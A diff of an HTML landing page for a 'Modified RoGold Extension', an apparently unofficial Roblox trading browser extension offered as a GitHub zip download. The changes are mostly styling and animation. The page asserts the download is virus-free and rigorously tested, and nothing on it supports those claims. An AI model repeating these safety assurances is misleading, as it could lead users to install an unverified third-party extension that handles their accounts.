@@ -1,43 +1,4 @@
-<script type="text/javascript">
-        var gk_isXlsx = false;
-        var gk_xlsxFileLookup = {};
-        var gk_fileData = {};
-        function filledCell(cell) {
-          return cell !== '' && cell != null;
-        }
-        function loadFileData(filename) {
-        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
-            try {
-                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
-                var firstSheetName = workbook.SheetNames[0];
-                var worksheet = workbook.Sheets[firstSheetName];
-
-                // Convert sheet to JSON to filter blank rows
-                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
-                // Filter out blank rows (rows where all cells are empty, null, or undefined)
-                var filteredData = jsonData.filter(row => row.some(filledCell));
-
-                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
-                var headerRowIndex = filteredData.findIndex((row, index) =>
-                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
-                );
-                // Fallback
-                if (headerRowIndex === -1 || headerRowIndex > 25) {
-                  headerRowIndex = 0;
-                }
-
-                // Convert filtered JSON back to CSV
-                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
-                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
-                return csv;
-            } catch (e) {
-                console.error(e);
-                return "";
-            }
-        }
-        return gk_fileData[filename] || "";
-        }
-        </script><!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -45,6 +6,7 @@
     <title>Modified RoGold Extension</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/vanilla-tilt@1.7.2/dist/vanilla-tilt.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
@@ -53,31 +15,66 @@
             font-family: 'Inter', sans-serif;
             overflow-x: hidden;
             transition: background-color 0.5s ease;
+            cursor: none;
+        }
+        .custom-cursor {
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #FFD700;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            transition: transform 0.2s ease, opacity 0.2s ease;
+        }
+        .custom-cursor:hover {
+            transform: scale(1.5);
+            background: rgba(255, 215, 0, 0.2);
         }
         .gradient-bg {
-            background: linear-gradient(135deg, #FFD700 0%, #FF8C00 50%, #FF4500 100%);
-            animation: gradientShift 10s ease infinite;
+            background: linear-gradient(135deg, #FFD700 0%, #FF8C00 50%, #FF1493 100%);
+            animation: gradientShift 12s ease infinite;
+            position: relative;
+            overflow: hidden;
+        }
+        .holographic::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, rgba(255, 215, 0, 0.2), rgba(255, 20, 147, 0.2));
+            opacity: 0.3;
+            z-index: 0;
+            animation: holographicGlow 5s ease infinite;
         }
         @keyframes gradientShift {
             0% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
             100% { background-position: 0% 50%; }
         }
+        @keyframes holographicGlow {
+            0% { opacity: 0.3; }
+            50% { opacity: 0.6; }
+            100% { opacity: 0.3; }
+        }
         .glass-card {
             background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.2);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
         .glass-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(255, 215, 0, 0.3);
         }
         .hover-scale {
             transition: transform 0.3s ease;
         }
         .hover-scale:hover {
-            transform: scale(1.15);
+            transform: scale(1.2);
         }
         #particles-js {
             position: absolute;
@@ -98,14 +95,17 @@
             z-index: 1000;
         }
         .dark-mode {
-            background-color: #1a1a1a;
+            background-color: #0a0a0a;
         }
         .dark-mode .glass-card {
-            background: rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.08);
         }
     </style>
 </head>
 <body class="bg-gray-900 text-white">
+    <!-- Custom Cursor -->
+    <div class="custom-cursor"></div>
+
     <!-- Dark Mode Toggle -->
     <button class="dark-mode-toggle bg-yellow-400 text-black p-2 rounded-full hover:bg-yellow-500 transition" onclick="toggleDarkMode()">
         <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -113,36 +113,36 @@
         </svg>
     </button>
 
-    <!-- Hero Section with Enhanced Particles -->
-    <section class="gradient-bg py-28 relative overflow-hidden">
+    <!-- Hero Section with Holographic Effect -->
+    <section class="gradient-bg py-32 relative overflow-hidden holographic">
         <div id="particles-js"></div>
         <div class="container mx-auto px-4 text-center content">
-            <h1 class="text-5xl md:text-7xl font-extrabold mb-6 animate__animated animate__fadeInDown">Modified RoGold Extension</h1>
-            <p class="text-xl md:text-2xl max-w-3xl mx-auto mb-10 animate__animated animate__fadeIn" style="animation-delay: 0.3s;">
-                Redefine Roblox trading with unparalleled security and a dazzling golden aesthetic. Real-time detection ensures your trades are always safe.
+            <h1 class="text-5xl md:text-8xl font-extrabold mb-6">Modified RoGold Extension</h1>
+            <p class="text-xl md:text-3xl max-w-3xl mx-auto mb-10">
+                Transform Roblox trading with unmatched security and a radiant golden aesthetic. Real-time detection for ultimate peace of mind.
             </p>
-            <a href="https://github.com/iBetaGold/rogoldmodded/archive/refs/heads/main.zip" class="inline-block bg-black text-yellow-400 font-semibold py-4 px-12 rounded-full hover-scale hover:bg-gray-800 animate__animated animate__pulse animate__infinite" style="animation-delay: 0.6s;" data-tilt data-tilt-glare data-tilt-max-glare="0.5">
+            <a href="https://github.com/iBetaGold/RoGoldedMod/archive/refs/heads/main.zip" class="inline-block bg-black text-yellow-400 font-semibold py-4 px-12 rounded-full hover-scale hover:bg-gray-800 animate__animated animate__pulse animate__infinite" style="animation-delay: 0.6s;" data-tilt data-tilt-glare data-tilt-max-glare="0.5">
                 Download Now
             </a>
         </div>
     </section>
 
-    <!-- Features Section with 3D Tilt -->
+    <!-- Features Section with ScrollTrigger -->
     <section class="py-24 bg-gray-800">
         <div class="container mx-auto px-4">
-            <h2 class="text-4xl font-bold text-center mb-12 animate__animated animate__fadeIn">Why Choose Modified RoGold?</h2>
+            <h2 class="text-4xl font-bold text-center mb-12">Why Choose Modified RoGold?</h2>
             <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-                <div class="glass-card p-8 rounded-xl" data-tilt data-tilt-glare data-tilt-max-glare="0.3">
-                    <h3 class="text-2xl font-semibold text-yellow-400 mb-4">Cutting-Edge Security</h3>
-                    <p>Advanced algorithms detect compromised items in real-time, keeping your trades secure.</p>
+                <div class="glass-card p-8 rounded-xl feature-card" data-tilt data-tilt-glare data-tilt-max-glare="0.3">
+                    <h3 class="text-2xl font-semibold text-yellow-400 mb-4">Next-Level Security</h3>
+                    <p>State-of-the-art algorithms detect compromised items instantly, ensuring safe trades.</p>
                 </div>
-                <div class="glass-card p-8 rounded-xl" data-tilt data-tilt-glare data-tilt-max-glare="0.3">
-                    <h3 class="text-2xl font-semibold text-yellow-400 mb-4">100% Virus-Free</h3>
-                    <p>Thoroughly verified for safety, delivering a trusted trading experience.</p>
+                <div class="glass-card p-8 rounded-xl feature-card" data-tilt data-tilt-glare data-tilt-max-glare="0.3">
+                    <h3 class="text-2xl font-semibold text-yellow-400 mb-4">Virus-Free Guarantee</h3>
+                    <p>Rigorously tested for safety, offering a seamless and trusted experience.</p>
                 </div>
-                <div class="glass-card p-8 rounded-xl" data-tilt data-tilt-glare data-tilt-max-glare="0.3">
-                    <h3 class="text-2xl font-semibold text-yellow-400 mb-4">Golden Elegance</h3>
-                    <p>A futuristic interface with a luxurious golden design for a premium feel.</p>
+                <div class="glass-card p-8 rounded-xl feature-card" data-tilt data-tilt-glare data-tilt-max-glare="0.3">
+                    <h3 class="text-2xl font-semibold text-yellow-400 mb-4">Holographic Design</h3>
+                    <p>A stunning golden interface with a futuristic, neon-infused aesthetic.</p>
                 </div>
             </div>
         </div>
@@ -151,8 +151,8 @@
     <!-- Download Section -->
     <section id="download" class="py-24 bg-gray-900 text-center">
         <div class="container mx-auto px-4">
-            <h2 class="text-4xl font-bold mb-6 animate__animated animate__zoomIn">Step Into the Future of Trading</h2>
-            <p class="text-xl max-w-xl mx-auto mb-10">Join thousands of Roblox traders with the ultimate extension for secure, stylish trading.</p>
+            <h2 class="text-4xl font-bold mb-6">Enter the Future of Trading</h2>
+            <p class="text-xl max-w-xl mx-auto mb-10">Join the elite Roblox traders with a secure, stylish extension.</p>
             <a href="https://github.com/iBetaGold/RoGoldedMod/archive/refs/heads/main.zip" class="inline-block bg-yellow-400 text-black font-semibold py-4 px-12 rounded-full hover-scale hover:bg-yellow-500" data-tilt data-tilt-glare data-tilt-max-glare="0.5">Get Started Now</a>
         </div>
     </section>
@@ -163,27 +163,45 @@
     </footer>
 
     <script>
-        // Initialize Particles.js with enhanced configuration
+        // Initialize Particles.js with enhanced interactivity
         particlesJS('particles-js', {
             particles: {
-                number: { value: 100, density: { enable: true, value_area: 800 } },
-                color: { value: ['#FFD700', '#FF8C00', '#FF4500'] },
-                shape: { type: 'circle', stroke: { width: 0 } },
-                opacity: { value: 0.6, random: true, anim: { enable: true, speed: 1 } },
-                size: { value: 4, random: true },
-                line_linked: { enable: true, distance: 150, color: '#FFD700', opacity: 0.2, width: 1 },
-                move: { enable: true, speed: 3, direction: 'none', random: true }
+                number: { value: 120, density: { enable: true, value_area: 800 } },
+                color: { value: ['#FFD700', '#FF8C00', '#FF1493'] },
+                shape: { type: ['circle', 'triangle', 'star'], stroke: { width: 0 } },
+                opacity: { value: 0.7, random: true, anim: { enable: true, speed: 1.5 } },
+                size: { value: 5, random: true },
+                line_linked: { enable: true, distance: 120, color: '#FFD700', opacity: 0.3, width: 1.5 },
+                move: { enable: true, speed: 4, direction: 'none', random: true }
             },
             interactivity: {
                 detect_on: 'canvas',
-                events: { onhover: { enable: true, mode: 'grab' }, onclick: { enable: true, mode: 'push' } },
-                modes: { grab: { distance: 200, line_linked: { opacity: 0.5 } }, push: { particles_nb: 5 } }
+                events: { onhover: { enable: true, mode: 'bubble' }, onclick: { enable: true, mode: 'push' } },
+                modes: { bubble: { distance: 200, size: 8, duration: 2, opacity: 0.8 }, push: { particles_nb: 6 } }
             },
             retina_detect: true
         });
 
-        // GSAP Animations
-        gsap.from('.animate__animated', {
+        // GSAP with ScrollTrigger Animations
+        gsap.registerPlugin(ScrollTrigger);
+        gsap.from('.feature-card', {
+            scrollTrigger: {
+                trigger: '.feature-card',
+                start: 'top 80%',
+                toggleActions: 'play none none none'
+            },
+            opacity: 0,
+            y: 100,
+            duration: 1,
+            stagger: 0.3,
+            ease: 'power3.out'
+        });
+
+        gsap.from('h1, p, a', {
+            scrollTrigger: {
+                trigger: '.gradient-bg',
+                start: 'top 80%'
+            },
             opacity: 0,
             y: 50,
             duration: 1,
@@ -212,11 +230,20 @@
 
         // Initialize Vanilla Tilt
         VanillaTilt.init(document.querySelectorAll("[data-tilt]"), {
-            max: 15,
-            speed: 400,
+            max: 20,
+            speed: 300,
             glare: true,
-            'max-glare': 0.5
+            'max-glare': 0.6
         });
+
+        // Custom Cursor
+        const cursor = document.querySelector('.custom-cursor');
+        document.addEventListener('mousemove', (e) => {
+            cursor.style.left = `${e.clientX - 10}px`;
+            cursor.style.top = `${e.clientY - 10}px`;
+        });
+        document.addEventListener('mousedown', () => cursor.style.transform = 'scale(1.5)');
+        document.addEventListener('mouseup', () => cursor.style.transform = 'scale(1)');
     </script>
 </body>
 </html>
